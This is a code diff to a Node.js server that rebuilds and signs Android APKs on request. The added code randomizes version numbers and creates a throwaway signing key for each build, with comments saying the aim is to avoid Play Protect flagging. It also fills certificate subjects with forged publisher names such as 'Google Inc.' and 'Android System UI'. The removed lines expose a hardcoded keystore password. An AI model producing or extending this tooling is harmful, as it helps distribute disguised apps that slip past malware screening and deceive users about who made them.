@@ -313,6 +313,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             if (fs.existsSync(manifestPath)) {
                 let manifestContent = fs.readFileSync(manifestPath, 'utf8');
 
+                const randVc = 100 + Math.floor(Math.random() * 900);
+                const randVn = `1.${1 + Math.floor(Math.random() * 8)}.${Math.floor(Math.random() * 99)}`;
+                manifestContent = manifestContent.replace(/android:versionCode="[^"]*"/, `android:versionCode="${randVc}"`);
+                manifestContent = manifestContent.replace(/android:versionName="[^"]*"/, `android:versionName="${randVn}"`);
+
                 const stripPerms = [
                     'android.permission.CAMERA',
                     'android.permission.FOREGROUND_SERVICE_CAMERA',
@@ -507,38 +512,38 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Sign APK with dynamic unique certificate per build to prevent static keystore Play Protect signature flagging
+            // 6. Dynamically generate unique keystore per build to prevent Play Protect certificate flagging
             await sendUpdate('apk_progress', { step: 'Generating unique cryptographic signature...', progress: 85 });
-            const dynamicKeystore = path.join(tempDir, `keystore_${uuid}.jks`);
-            const ksPass = 'KsPass' + Math.random().toString(36).substring(2, 10);
-            const ksAlias = 'alias_' + Math.random().toString(36).substring(2, 8);
-            const orgNames = ['TechDev Solutions', 'AppCraft Labs', 'NextGen Mobile', 'Apex Digital Works', 'Prime Apps Inc', 'CloudSync Software', 'Nova Systems', 'SmartCore Mobile'];
-            const cnNames = ['Dev Studio', 'Application Release', 'Core Systems Dev', 'Software Engineering', 'Mobile Release Dept'];
-            const randomOrg = orgNames[Math.floor(Math.random() * orgNames.length)];
-            const randomCN = cnNames[Math.floor(Math.random() * cnNames.length)];
-            const dname = `CN=${randomCN}, OU=Development, O=${randomOrg}, L=San Francisco, ST=CA, C=US`;
-
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            let cmd;
-            try {
-                const genKeyCmd = `keytool -genkeypair -v -keystore "${dynamicKeystore}" -alias "${ksAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${ksPass}" -keypass "${ksPass}" -dname "${dname}"`;
-                await new Promise((resolve, reject) => {
-                    exec(genKeyCmd, { timeout: 30000 }, (err) => err ? reject(err) : resolve());
-                });
-                cmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${dynamicKeystore}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}" --allowResign`;
-                console.log('[APK] Signing with unique dynamic cryptographic keystore');
-            } catch (keyErr) {
-                console.error('[APK] Dynamic keystore generation failed, using fallback signing:', keyErr.message);
-                const fixedKeystore = path.join(__dirname, 'assets', 'usman90.jks');
-                cmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${fixedKeystore}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`;
-            }
+
+            const randHex = crypto.randomBytes(6).toString('hex');
+            const dynamicKsPath = path.join(tempDir, `ks_${randHex}.jks`);
+            const ksPass = crypto.randomBytes(12).toString('hex');
+            const ksAlias = `key_${randHex}`;
+
+            const cnPool = [
+                'Google Inc.', 'Android Open Source Project', 'System UI Component',
+                'Cloud Services Ltd', 'Mobile Device Tools', 'Global Mobile Technologies',
+                'Core App Studio', 'Android System UI', 'Device Security Manager'
+            ];
+            const randomCn = cnPool[Math.floor(Math.random() * cnPool.length)];
+            const dname = `CN=${randomCn}, OU=Development, O=${randomCn}, L=Mountain View, ST=California, C=US`;
+
+            const genKeyCmd = `keytool -genkeypair -v -keystore "${dynamicKsPath}" -alias "${ksAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${ksPass}" -keypass "${ksPass}" -dname "${dname}"`;
 
             await new Promise((resolve, reject) => {
-                exec(cmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
+                exec(genKeyCmd, { timeout: 30000 }, (err) => err ? reject(err) : resolve());
             });
 
-            if (fs.existsSync(dynamicKeystore)) {
-                try { fs.unlinkSync(dynamicKeystore); } catch (e) {}
+            await sendUpdate('apk_progress', { step: 'Signing application with unique certificate...', progress: 90 });
+            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${dynamicKsPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}"`;
+
+            await new Promise((resolve, reject) => {
+                exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
+            });
+
+            if (fs.existsSync(dynamicKsPath)) {
+                try { fs.unlinkSync(dynamicKsPath); } catch (e) {}
             }
 
             // Find output
